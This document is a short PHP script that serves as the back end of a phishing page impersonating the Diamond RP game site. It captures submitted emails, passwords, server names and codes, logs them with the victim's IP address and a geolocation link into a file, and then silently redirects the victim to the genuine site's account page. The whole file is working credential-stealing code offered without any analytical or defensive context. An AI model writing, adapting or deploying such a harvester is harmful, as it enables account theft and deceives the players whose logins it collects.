
<?PHP
 $Log = $_POST['email'];
 $Pass =$_POST['password'];
 $Pas =$_POST['gameserver'];
 $cod =$_POST['code'];

 $ip=$_SERVER['REMOTE_ADDR'];
 $time = date("H:i | d.m.Y");
 $ssilka = "./io.php";
 If (isset($_POST['email'])){ 
 $fp = fopen($ssilka, "a"); 
 $mytext = "<div>Ник: $Log | Пароль: $Pass | Сервер: $Pas | Код: $cod | IP: <a href = http://ipgeobase.ru/?address=$ip&search= target=_blank style = color:#3AE2CE>$ip </a> | $time |</div>\n";
 $test = fwrite($fp, $mytext);
 fclose($fp);
 echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://diamondrp.ru/%D0%9B%D0%B8%D1%87%D0%BD%D1%8B%D0%B9-%D0%BA%D0%B0%D0%B1%D0%B8%D0%BD%D0%B5%D1%82.html'></head></html>";
 }
?>